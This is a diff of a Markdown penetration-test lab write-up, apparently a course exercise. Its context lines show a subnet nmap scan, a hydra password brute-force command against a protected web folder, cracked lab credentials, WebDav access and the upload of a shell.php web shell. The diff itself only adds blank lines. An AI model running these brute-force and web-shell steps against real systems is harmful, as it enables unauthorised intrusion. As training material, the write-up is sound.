@@ -8,6 +8,7 @@ Command:
 `ifconfig`
 
 Result:
+
 IP 192.168.1.90 and Netmask 255.255.255.0
 
 ![ifconfig terminal results](/Images/ifconfig-results.png "ifconfig terminal results")
@@ -19,6 +20,7 @@ Command:
 `nmap -sS -A 192.168.1.1/24`
 
 Result:
+
 IP 192.168.1.105
 
 ![nmap terminal results](/Images/nmap-results.png "nmap terminal results")
@@ -60,7 +62,9 @@ Command:
 `hydra -l ashton -P rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`
 
 Result:
+
 login: ashton 
+
 password: leopoldo
 
 ![Hydra results](/Images/hydra-results.png "Hydra results")
@@ -73,9 +77,11 @@ In the secret_folder a note was found with instructions to connect to a WebDav s
 This note included some important information including an account to use, the hash for that account and where to navigate to in a file directory. 
 
 Note found:
+
 ![secret note](/Images/secret-note.png "secret note")
 
 Using CrackStation to crack the hash from the note:
+
 ![Crackstation results](/Images/crackstation-results.png "Crackstation results")
 
 Next is to access the WebDav server with username ryan and password linux4u.
@@ -156,6 +162,7 @@ Command:
 `ls`
 
 Result:
+
 shell.php was uploaded to to the WebDav server
 
 ![shell.php uploaded to WebDav](/Images/shell-upload-webdav.png "shell.php uploaded to WebDav")
